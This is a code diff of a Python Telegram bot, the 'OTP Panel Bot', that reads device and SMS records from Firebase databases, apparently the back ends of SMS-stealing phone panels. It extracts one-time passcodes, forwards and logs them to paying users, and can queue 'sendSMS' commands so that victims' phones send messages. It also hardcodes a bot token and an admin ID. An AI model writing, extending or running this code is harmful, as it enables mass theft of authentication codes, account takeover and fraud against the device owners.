@@ -3,7 +3,7 @@
 ══════════════════════════════════════════════════════
   OTP PANEL BOT — PRIVATE ADMIN EDITION           
   ULTRA-SPEED PROGRESSIVE SCANNER & NON-BLOCKING UI
-  (RAILWAY STABLE EDITION - ANTI-RESET LOGIC)
+  (RAILWAY IRONCLAD PERSISTENCE EDITION - NO DATA DROP)
 ══════════════════════════════════════════════════════
 """
 
@@ -31,45 +31,28 @@ from telegram.ext import (
     ContextTypes,
 )
 
-# 🔥 Hide default HTTP & DNS logs for a clean terminal
 warnings.filterwarnings("ignore", category=DeprecationWarning)
-logging.basicConfig(
-    format="%(asctime)s — %(levelname)s — %(message)s",
-    level=logging.WARNING, 
-)
+logging.basicConfig(format="%(asctime)s — %(levelname)s — %(message)s", level=logging.WARNING)
 logging.getLogger("httpx").setLevel(logging.CRITICAL)
 logging.getLogger("asyncio").setLevel(logging.CRITICAL)
 logging.getLogger("aiohttp").setLevel(logging.CRITICAL)
 
-# ═══════════════════════════════════════════════════════
-#  AUTO-EXTRACTOR: READS ALL LOCAL JSON & TXT FILES FOR FIREBASE URLS
-# ═══════════════════════════════════════════════════════
-
 def extract_urls_from_files() -> list:
     extracted_urls = set()
     pattern = re.compile(r'https?://[a-zA-Z0-9-]+\.(?:firebaseio\.com|[a-zA-Z0-9-]+\.firebasedatabase\.app)')
-    
     current_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else '.'
-    
     for filename in os.listdir(current_dir):
-        if (filename.endswith('.json') or filename.endswith('.txt')) and filename not in ['settings.json', 'requirements.txt']:
+        if (filename.endswith('.json') or filename.endswith('.txt')) and filename not in ['settings.json', 'requirements.txt', 'device_cache.json']:
             filepath = os.path.join(current_dir, filename)
             try:
                 with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                     content = f.read()
                     matches = pattern.findall(content)
                     extracted_urls.update(matches)
-            except Exception:
-                pass
-                
+            except Exception: pass
     return list(extracted_urls)
 
-# ═══════════════════════════════════════════════════════
-#  CONFIG & FULL FIREBASE URLS
-# ═══════════════════════════════════════════════════════
-
 HARDCODED_URLS = []
-
 LOCAL_URLS = extract_urls_from_files()
 RAW_URLS = list(set(HARDCODED_URLS + LOCAL_URLS))
 DATABASES = {f"P_{i}": url for i, url in enumerate(RAW_URLS)}
@@ -80,12 +63,8 @@ SMS_LIMIT       = 20
 TOKEN           = "8218848065:AAFw5snj5NTWbayoXSHHIaNEg-vFPuXGm-4"
 BOT_USERNAME    = "freepanelssmsbot"
 PAGE_SIZE       = 10
+ADMIN_IDS: set[int] = {6860106371}
 
-ADMIN_IDS: set[int] = {
-    6860106371,   
-}
-
-# 🔥 RAILWAY VOLUME MOUNT
 BASE_DIR = os.getenv("RAILWAY_VOLUME_MOUNT_PATH", os.path.dirname(os.path.abspath(__file__)))
 DB_DIR = os.path.join(BASE_DIR, "Panel_Databases")
 USERS_DIR = os.path.join(DB_DIR, "Users")
@@ -93,9 +72,8 @@ CLONES_DIR = os.path.join(DB_DIR, "Clones")
 SYS_DIR = os.path.join(DB_DIR, "System")
 SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")
 
-# ═══════════════════════════════════════════════════════
-#  GLOBAL STATE, QUEUE, CACHE & PROGRESS TRACKER
-# ═══════════════════════════════════════════════════════
+# 🔥 PERSISTENT CACHE FILE
+CACHE_FILE = os.path.join(SYS_DIR, "device_cache.json")
 
 seen_ids:  set[str] = set()   
 first_run: bool     = True
@@ -114,18 +92,11 @@ chats_registry: dict[str, set[int]] = {TOKEN: set()}
 
 CLONES: dict[str, dict] = {}
 GLOBAL_DEVICE_CACHE: dict[str, list] = {}
-
 SCAN_PROGRESS = {"total": 1, "completed": 1}
+SETTINGS = {"base_price": 30, "global_panels": []}
 
-SETTINGS = {
-    "base_price": 30,
-    "global_panels": []
-}
-
-# 🔥 BALANCED SEMAPHORES FOR SPEED + STABILITY
 HTTP_SEMAPHORE = asyncio.Semaphore(50)
 WORKER_SEMAPHORE = asyncio.Semaphore(50)
-
 API_LOCK = asyncio.Lock()
 
 SYS_SETTINGS = {
@@ -166,57 +137,53 @@ SYS_SETTINGS = {
     "check_anim": "⚡"
 }
 
-# ═══════════════════════════════════════════════════════
-#  DATA CLASSES
-# ═══════════════════════════════════════════════════════
-
 class Device:
-    __slots__ = (
-        "id", "name", "status", "battery", "timestamp",
-        "numbers", "device_info", "sms_path", "base_url", "db_tag", "last_sms_ts"
-    )
+    __slots__ = ("id", "name", "status", "battery", "timestamp", "numbers", "device_info", "sms_path", "base_url", "db_tag", "last_sms_ts")
     def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag, last_sms_ts=0.0):
-        self.id = id
-        self.name = name
-        self.status = status
-        self.battery = battery
-        self.timestamp = timestamp
-        self.numbers = numbers
-        self.device_info = device_info
-        self.sms_path = sms_path
-        self.base_url = base_url
-        self.db_tag = db_tag
-        self.last_sms_ts = last_sms_ts
-
-# ═══════════════════════════════════════════════════════
-#  INDIVIDUAL FILE DATA SYSTEM
-# ═══════════════════════════════════════════════════════
+        self.id = id; self.name = name; self.status = status; self.battery = battery
+        self.timestamp = timestamp; self.numbers = numbers; self.device_info = device_info
+        self.sms_path = sms_path; self.base_url = base_url; self.db_tag = db_tag; self.last_sms_ts = last_sms_ts
+        
+    def to_dict(self):
+        return {"id": self.id, "name": self.name, "status": self.status, "battery": self.battery, "timestamp": self.timestamp, "numbers": self.numbers, "device_info": self.device_info, "sms_path": self.sms_path, "base_url": self.base_url, "db_tag": self.db_tag, "last_sms_ts": self.last_sms_ts}
+    
+    @classmethod
+    def from_dict(cls, data):
+        return cls(data["id"], data["name"], data["status"], data["battery"], data["timestamp"], data["numbers"], data["device_info"], data["sms_path"], data["base_url"], data["db_tag"], data.get("last_sms_ts", 0.0))
 
 def init_dirs():
     os.makedirs(USERS_DIR, exist_ok=True)
     os.makedirs(CLONES_DIR, exist_ok=True)
     os.makedirs(SYS_DIR, exist_ok=True)
     if not os.path.exists(SMS_LOG_FILE):
-        with open(SMS_LOG_FILE, "w", encoding="utf-8") as f:
-            f.write("--- SYSTEM MASTER SMS LOG ---\n")
+        with open(SMS_LOG_FILE, "w", encoding="utf-8") as f: f.write("--- SYSTEM MASTER SMS LOG ---\n")
 
 def load_data():
-    global all_users, CLONES, SETTINGS
+    global all_users, CLONES, SETTINGS, GLOBAL_DEVICE_CACHE
     init_dirs()
     
     set_path = os.path.join(SYS_DIR, "settings.json")
     if os.path.exists(set_path):
         try:
-            with open(set_path, "r", encoding="utf-8") as f:
-                SETTINGS.update(json.load(f))
+            with open(set_path, "r", encoding="utf-8") as f: SETTINGS.update(json.load(f))
         except: pass
+
+    # 🔥 LOAD CACHE FROM DISK SO IT NEVER DIES ON RESTART
+    if os.path.exists(CACHE_FILE):
+        try:
+            with open(CACHE_FILE, "r", encoding="utf-8") as f:
+                saved_cache = json.load(f)
+                for tag, dev_list in saved_cache.items():
+                    GLOBAL_DEVICE_CACHE[tag] = [Device.from_dict(d) for d in dev_list]
+                print(f"[*] Loaded {sum(len(v) for v in GLOBAL_DEVICE_CACHE.values())} devices from disk cache.")
+        except Exception as e:
+            print(f"[*] Failed to load cache: {e}")
 
     for fname in os.listdir(USERS_DIR):
         if fname.endswith(".json"):
             try:
                 uid = int(fname.split(".")[0])
-                with open(os.path.join(USERS_DIR, fname), "r", encoding="utf-8") as f:
-                    all_users[uid] = json.load(f)
+                with open(os.path.join(USERS_DIR, fname), "r", encoding="utf-8") as f: all_users[uid] = json.load(f)
             except: pass
                 
     for fname in os.listdir(CLONES_DIR):
@@ -224,11 +191,9 @@ def load_data():
             try:
                 with open(os.path.join(CLONES_DIR, fname), "r", encoding="utf-8") as f:
                     cdata = json.load(f)
-                    restored_users = {int(k): v for k, v in cdata.get("users", {}).items()}
-                    cdata["users"] = restored_users
+                    cdata["users"] = {int(k): v for k, v in cdata.get("users", {}).items()}
                     token = cdata.get("bot_token")
-                    if token:
-                        CLONES[token] = cdata
+                    if token: CLONES[token] = cdata
             except: pass
             
     for adm in ADMIN_IDS:
@@ -236,35 +201,13 @@ def load_data():
             all_users[adm]["global_spam"] = False 
             save_user(adm)
         if adm not in all_users:
-            all_users[adm] = {
-                "name": "Supreme Owner",
-                "username": "",
-                "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
-                "verified": True,
-                "referrals": 0,
-                "coins": 999999,
-                "vip_until": 2e10,
-                "vip_paused_left": 0.0,
-                "vip_expired_purchases": 0,
-                "bot_expired_purchases": 0,
-                "pdb_expired_purchases": 0,
-                "otp_count": 0,
-                "bots_created": 0,
-                "bonus_10_received": True,
-                "global_spam": False, 
-                "custom_dbs": [],
-                "selected_panel": "ALL",
-                "transactions": [],
-                "referred_by": None,
-                "banned": False
-            }
+            all_users[adm] = {"name": "Supreme Owner", "username": "", "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"), "verified": True, "referrals": 0, "coins": 999999, "vip_until": 2e10, "vip_paused_left": 0.0, "vip_expired_purchases": 0, "bot_expired_purchases": 0, "pdb_expired_purchases": 0, "otp_count": 0, "bots_created": 0, "bonus_10_received": True, "global_spam": False, "custom_dbs": [], "selected_panel": "ALL", "transactions": [], "referred_by": None, "banned": False}
             save_user(adm)
 
 def save_user(uid: int):
     init_dirs()
     if uid in all_users:
-        with open(os.path.join(USERS_DIR, f"{uid}.json"), "w", encoding="utf-8") as f:
-            json.dump(all_users[uid], f, indent=4)
+        with open(os.path.join(USERS_DIR, f"{uid}.json"), "w", encoding="utf-8") as f: json.dump(all_users[uid], f, indent=4)
 
 def save_clone(token: str):
     init_dirs()
@@ -273,20 +216,28 @@ def save_clone(token: str):
         data = CLONES[token].copy()
         data["bot_token"] = token 
         data.pop("app", None) 
-        with open(os.path.join(CLONES_DIR, f"{safe_name}.json"), "w", encoding="utf-8") as f:
-            json.dump(data, f, indent=4)
+        with open(os.path.join(CLONES_DIR, f"{safe_name}.json"), "w", encoding="utf-8") as f: json.dump(data, f, indent=4)
 
 def save_settings():
     init_dirs()
-    with open(os.path.join(SYS_DIR, "settings.json"), "w", encoding="utf-8") as f:
-        json.dump(SETTINGS, f, indent=4)
+    with open(os.path.join(SYS_DIR, "settings.json"), "w", encoding="utf-8") as f: json.dump(SETTINGS, f, indent=4)
+
+# 🔥 SAVE DEVICE CACHE TO DISK
+def save_device_cache():
+    try:
+        data_to_save = {}
+        for tag, devs in GLOBAL_DEVICE_CACHE.items():
+            if tag != "ALL": # Don't save the compiled list
+                data_to_save[tag] = [d.to_dict() for d in devs]
+        with open(CACHE_FILE, "w", encoding="utf-8") as f:
+            json.dump(data_to_save, f)
+    except: pass
 
 def _sync_save_data():
     save_settings()
-    for uid in list(all_users.keys()):
-        save_user(uid)
-    for token in list(CLONES.keys()):
-        save_clone(token)
+    for uid in list(all_users.keys()): save_user(uid)
+    for token in list(CLONES.keys()): save_clone(token)
+    save_device_cache() # Save cache periodically
 
 async def save_data_async():
     await asyncio.to_thread(_sync_save_data)
@@ -295,8 +246,7 @@ def master_log_sms(number: str, message: str, otp: str):
     try:
         t = datetime.now().strftime("%d-%b-%Y %I:%M:%S %p")
         log_line = f"[{t}] NUM: {number} | OTP: {otp or 'N/A'} | MSG: {message}\n"
-        with open(SMS_LOG_FILE, "a", encoding="utf-8") as f:
-            f.write(log_line)
+        with open(SMS_LOG_FILE, "a", encoding="utf-8") as f: f.write(log_line)
     except: pass
 
 async def auto_save_loop():
@@ -304,51 +254,30 @@ async def auto_save_loop():
         await asyncio.sleep(60)
         await save_data_async()
 
-# ═══════════════════════════════════════════════════════
-#  ANTI-SPAM & UTILS
-# ═══════════════════════════════════════════════════════
-
 def get_user_dbs(uinfo: dict) -> list:
     dbs = uinfo.get("custom_dbs", [])
     valid_urls = []
     now = time.time()
     for db in dbs:
-        if isinstance(db, str): 
-            valid_urls.append(db)
-        elif isinstance(db, dict) and db.get("expiry", 0) > now:
-            valid_urls.append(db["url"])
-            
-    if isinstance(uinfo.get("custom_db"), str) and uinfo["custom_db"] not in valid_urls:
-        valid_urls.append(uinfo["custom_db"])
-        
+        if isinstance(db, str): valid_urls.append(db)
+        elif isinstance(db, dict) and db.get("expiry", 0) > now: valid_urls.append(db["url"])
+    if isinstance(uinfo.get("custom_db"), str) and uinfo["custom_db"] not in valid_urls: valid_urls.append(uinfo["custom_db"])
     return list(set(valid_urls))
 
 def is_spamming(user_id: int) -> bool:
     if user_id in ADMIN_IDS: return False
     now = time.time()
-    last_click = user_cooldowns.get(user_id, 0)
-    if now - last_click < 1.0:  
-        return True
+    if now - user_cooldowns.get(user_id, 0) < 1.0: return True
     user_cooldowns[user_id] = now
     return False
 
-def tlog(msg: str) -> None:
-    pass # Print hata diya taaki logs clear rahein
+def tlog(msg: str) -> None: pass 
 
 async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
     err_str = str(context.error)
-    ignore_errors = [
-        "Forbidden", "Chat not found", "bot was blocked", "not modified", 
-        "Message to edit not found", "ChatNotFound", "ReadError", "NetworkError", 
-        "TimedOut", "Event loop is closed", "gaierror"
-    ]
-    if any(e in err_str for e in ignore_errors):
-        return
+    ignore_errors = ["Forbidden", "Chat not found", "bot was blocked", "not modified", "Message to edit not found", "ChatNotFound", "ReadError", "NetworkError", "TimedOut", "Event loop is closed", "gaierror"]
+    if any(e in err_str for e in ignore_errors): return
     pass
-
-# ═══════════════════════════════════════════════════════
-#  FAST HTTP SESSION MANAGER 
-# ═══════════════════════════════════════════════════════
 
 async def get_http_session() -> aiohttp.ClientSession:
     global _http_session
@@ -365,13 +294,9 @@ async def fb_get(path: str, base: str) -> Optional[dict]:
             if not path: url = url.replace("?shallow=true", ".json")
             async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
                 if r.status != 200: return None
-                try:
-                    data = await r.json(content_type=None)
-                    return data if isinstance(data, dict) else None
-                except Exception:
-                    return None
-        except Exception:
-            return None
+                try: return await r.json(content_type=None)
+                except Exception: return None
+        except Exception: return None
 
 async def fb_keys(path: str, base: str) -> list[str]:
     async with HTTP_SEMAPHORE:
@@ -383,10 +308,8 @@ async def fb_keys(path: str, base: str) -> list[str]:
                 try:
                     data = await r.json(content_type=None)
                     return list(data.keys()) if isinstance(data, dict) else []
-                except Exception:
-                    return []
-        except Exception:
-            return []
+                except Exception: return []
+        except Exception: return []
 
 async def check_number_api(service: str, number: str, retries=2) -> dict:
     clean_number = re.sub(r"\D", "", str(number))[-10:]
@@ -429,25 +352,10 @@ async def fb_send_sms(device, to_number: str, msg: str):
         try:
             base_node = device.sms_path.replace("/sms", "").replace("user_sms", "user_data")
             send_url = f"{device.base_url}/{base_node}/sendSMS.json"
-            
-            payload = {
-                "number": to_number,
-                "phone": to_number,
-                "phoneNo": to_number,
-                "message": msg,
-                "msg": msg,
-                "text": msg,
-                "status": "pending"
-            }
+            payload = {"number": to_number, "phone": to_number, "phoneNo": to_number, "message": msg, "msg": msg, "text": msg, "status": "pending"}
             session = await get_http_session()
-            async with session.post(send_url, json=payload, timeout=aiohttp.ClientTimeout(total=2)) as r:
-                pass
-        except:
-            pass
-
-# ═══════════════════════════════════════════════════════
-#  UTILITY FUNCTIONS
-# ═══════════════════════════════════════════════════════
+            async with session.post(send_url, json=payload, timeout=aiohttp.ClientTimeout(total=2)) as r: pass
+        except: pass
 
 def fmt_num(n: str) -> str:
     c = re.sub(r"\D", "", str(n))
@@ -463,22 +371,12 @@ def extract_all_nums(*dicts) -> list[str]:
         if not isinstance(d, dict): continue
         for k in keys_to_check:
             val = str(d.get(k, ""))
-            if val and len(re.sub(r"\D", "", val)) > 4:
-                nums.append(fmt_num(val))
+            if val and len(re.sub(r"\D", "", val)) > 4: nums.append(fmt_num(val))
     return list(set(nums))
 
-def bat_emoji(pct: int) -> str:
-    return "🔋" if pct >= 20 else "🪫"
+def bat_emoji(pct: int) -> str: return "🔋" if pct >= 20 else "🪫"
 
-OTP_PATTERNS = [
-    re.compile(r"OTP[^\d]*(\d{4,8})",        re.IGNORECASE),
-    re.compile(r"code[^\d]*(\d{4,8})",       re.IGNORECASE),
-    re.compile(r"password[^\d]*(\d{4,8})",   re.IGNORECASE),
-    re.compile(r"\b(G-\d{6})\b",             re.IGNORECASE), 
-    re.compile(r"\b([A-Z0-9]{5,8})\b",       re.IGNORECASE), 
-    re.compile(r"\b(\d{6})\b"),
-    re.compile(r"\b(\d{4})\b"),
-]
+OTP_PATTERNS = [re.compile(r"OTP[^\d]*(\d{4,8})", re.IGNORECASE), re.compile(r"code[^\d]*(\d{4,8})", re.IGNORECASE), re.compile(r"password[^\d]*(\d{4,8})", re.IGNORECASE), re.compile(r"\b(G-\d{6})\b", re.IGNORECASE), re.compile(r"\b([A-Z0-9]{5,8})\b", re.IGNORECASE), re.compile(r"\b(\d{6})\b"), re.compile(r"\b(\d{4})\b")]
 
 def extract_otp(text: str) -> Optional[str]:
     if not text: return None
@@ -499,13 +397,8 @@ def parse_battery(val) -> int:
         return int(digits) if digits else 0
     return 0
 
-def parse_status_str(val) -> str:
-    if not val: return "offline"
-    return "online" if str(val).lower() == "online" else "offline"
-
-def parse_status_bool(val) -> str:
-    return "online" if val is True else "offline"
-
+def parse_status_str(val) -> str: return "online" if str(val).lower() == "online" else "offline"
+def parse_status_bool(val) -> str: return "online" if val is True else "offline"
 def sms_date(sms: dict) -> str:
     date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
     if date_str: return date_str
@@ -516,17 +409,8 @@ def sms_date(sms: dict) -> str:
             return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
         except: pass
     return "N/A"
-
-def seen_key(device_id: str, k: str) -> str:
-    return f"{device_id}/{k}"
-
-def device_label(d: 'Device') -> str:
-    if d.numbers: return " & ".join(d.numbers)
-    return f"{d.name} ({d.id[:8]})"
-
-# ═══════════════════════════════════════════════════════
-#  FIREBASE DATA FETCHERS 
-# ═══════════════════════════════════════════════════════
+def seen_key(device_id: str, k: str) -> str: return f"{device_id}/{k}"
+def device_label(d: 'Device') -> str: return " & ".join(d.numbers) if d.numbers else f"{d.name} ({d.id[:8]})"
 
 async def fetch_db_data(tag: str, url: str) -> list[Device]:
     async with WORKER_SEMAPHORE:
@@ -590,28 +474,22 @@ async def fetch_db_data(tag: str, url: str) -> list[Device]:
 async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
     if users_db is None: users_db = {}
     dbs_to_check = list(DATABASES.keys())
-    for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
-        dbs_to_check.append(f"G_{i}")
+    for i, g_url in enumerate(SETTINGS.get("global_panels", [])): dbs_to_check.append(f"G_{i}")
     for uid, uinfo in all_users.items():
         if uid in ADMIN_IDS:
-            for i, _ in enumerate(get_user_dbs(uinfo)):
-                dbs_to_check.append(f"U_{uid}_{i}")
+            for i, _ in enumerate(get_user_dbs(uinfo)): dbs_to_check.append(f"U_{uid}_{i}")
 
     all_gathered = []
-    for tag in dbs_to_check:
-        all_gathered.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
+    for tag in dbs_to_check: all_gathered.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
 
     number_map = {}
     for d in all_gathered:
         if d.numbers:
             main_num = d.numbers[0]
-            if main_num not in number_map:
-                number_map[main_num] = d
+            if main_num not in number_map: number_map[main_num] = d
             else:
-                if d.timestamp > number_map[main_num].timestamp:
-                    number_map[main_num] = d
-        else:
-            number_map[d.id] = d 
+                if d.timestamp > number_map[main_num].timestamp: number_map[main_num] = d
+        else: number_map[d.id] = d 
 
     unique_devices = list(number_map.values())
     unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
@@ -662,7 +540,6 @@ async def show_fresh30_page(message_obj, chat_id, page, bot_token, users_db):
     PAGE_SIZE = 5 
     total_pages = max(1, (total_devs + PAGE_SIZE - 1) // PAGE_SIZE) 
     page = max(0, min(page, total_pages - 1))
-
     start = page * PAGE_SIZE
     page_ids = dev_ids[start:start+PAGE_SIZE]
 
@@ -686,7 +563,6 @@ async def show_fresh30_page(message_obj, chat_id, page, bot_token, users_db):
     
     if nav: kb.append(nav)
     kb.append([InlineKeyboardButton("🏠 Main Menu", callback_data="home")])
-
     await safe_edit(message_obj, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
 
 # ═══════════════════════════════════════════════════════
@@ -730,7 +606,6 @@ def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_e
                 break
     
     display_num = number if str(number).startswith("+") else f"+{number}"
-    
     if is_error: return f"⚠️ <b>ERROR</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms\n\n<i>{err_msg}</i>"
     return f"<b>{'✅ REGISTERED' if is_reg else '❌ UNREGISTERED'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms"
 
@@ -741,8 +616,9 @@ def device_list_header(devices: list[Device], page: int = 0) -> str:
     total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
     
     progress = ""
-    if SCAN_PROGRESS["completed"] < SCAN_PROGRESS["total"]:
-        pct = int((SCAN_PROGRESS["completed"] / max(1, SCAN_PROGRESS["total"])) * 100)
+    # Only show scan progress if not complete AND total > 1
+    if SCAN_PROGRESS["completed"] < SCAN_PROGRESS["total"] and SCAN_PROGRESS["total"] > 1:
+        pct = int((SCAN_PROGRESS["completed"] / SCAN_PROGRESS["total"]) * 100)
         progress = f"🔄 Initial Scan: {SCAN_PROGRESS['completed']}/{SCAN_PROGRESS['total']} ({pct}%)\n"
         
     return (
@@ -818,7 +694,6 @@ def auto_forward_msg(sms: dict, num_label: str) -> str:
     date   = sms_date(sms)
     sim    = sms.get("sim_number") or ""
     sender = sms.get("sender") or "Unknown"
-    
     if otp:
         sim_line = f"│ SIM : {sim}\n" if sim else ""
         return f"NEW OTP RECEIVED\n━━━━━━━━━━━━━━━━━━\n│ OTP : {otp}\n│ Number : {num_label}\n│ From : {sender}\n│ Date : {date}\n{sim_line}━━━━━━━━━━━━━━━━━━\n{body}"
@@ -834,7 +709,6 @@ def admin_panel_text(bot_token: str) -> str:
     users_db = all_users
     total    = len(users_db)
     total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
-    
     text = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total}\nTotal OTP Views: {total_otps}\n"
     text += f"━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
     return text
@@ -857,8 +731,7 @@ async def safe_edit(query_or_msg, text, reply_markup=None, parse_mode=None, disa
             await query_or_msg.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
     except BadRequest as e:
         if "not modified" not in str(e).lower(): pass
-    except Exception:
-        pass
+    except Exception: pass
 
 # ═══════════════════════════════════════════════════════
 #  TELEGRAM COMMAND HANDLERS
@@ -926,8 +799,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Fetching ONLINE devices active in last 4 HOURS...</i>", parse_mode="HTML")
             
             all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
-            if not all_devices:
-                all_devices = await get_all_devices(bot_token, chat_id, users_db)
+            if not all_devices: all_devices = await get_all_devices(bot_token, chat_id, users_db)
             
             fresh_devices = [d for d in all_devices if d.status == "online" and d.numbers and (time.time() - (d.timestamp if d.timestamp < 1e11 else d.timestamp / 1000)) <= 14400]
             if not fresh_devices: 
@@ -938,7 +810,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             
             seen_set = user_seen_unreg.setdefault(chat_id, set())
             if len(seen_set) > 1000: seen_set.clear() 
-            
             fresh_devices = [d for d in fresh_devices if d.numbers[0] not in seen_set]
             
             found_unreg, final_res, final_dev, final_num = False, None, None, ""
@@ -1336,11 +1207,6 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         await wait_msg.edit_text(results_text, reply_markup=InlineKeyboardMarkup(kb))
         return
 
-    if text == "Admin Panel":
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        await update.message.reply_text(admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token))
-        return
-
     if text.lower() in ("/cancel", "cancel"):
         if chat_id in pending_action:
             pending_action.pop(chat_id)
@@ -1516,7 +1382,7 @@ async def _forward_sms(device: Device, sms: dict) -> None:
 
 WORK_QUEUE = asyncio.Queue()
 ACTIVE_WORKERS = []
-MAX_WORKERS = 15 
+MAX_WORKERS = 10 
 
 async def worker_auto_scaler():
     while True:
@@ -1535,8 +1401,7 @@ async def db_processor_worker():
             if job_type == "INIT" or job_type == "CACHE_UPDATE":
                 try: 
                     devs = await fetch_db_data(tag, url)
-                    if devs: # 🔥 MAGIC FIX: Data sirf tabhi update hoga jab API kuch return karega, blank list nahi aayegi.
-                        GLOBAL_DEVICE_CACHE[tag] = devs
+                    if devs: GLOBAL_DEVICE_CACHE[tag] = devs
                 except: pass
                 
                 if job_type == "INIT":
@@ -1616,6 +1481,7 @@ async def cache_compiler():
                 n_map[d.id] = d
                     
         res = list(n_map.values())
+        
         res.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
         GLOBAL_DEVICE_CACHE["ALL"] = res
 
@@ -1641,13 +1507,15 @@ async def master_dispatcher(app: Application) -> None:
                 print("\n✅ Bot started successfully. Listening for commands...\n")
             else:
                 now = time.time()
+                # Fast polling every 10 seconds for SMS
+                for tag, url in dbs_to_poll.items():
+                    await WORK_QUEUE.put(("POLL", tag, url))
+                
+                # Slower caching every 10 minutes (600s) for Full Device List
                 if now - last_cache_time > CACHE_INTERVAL:
                     for tag, url in dbs_to_poll.items():
                         await WORK_QUEUE.put(("CACHE_UPDATE", tag, url))
                     last_cache_time = now
-                
-                for tag, url in dbs_to_poll.items():
-                    await WORK_QUEUE.put(("POLL", tag, url))
                     
         except Exception: pass
         await asyncio.sleep(POLL_INTERVAL)
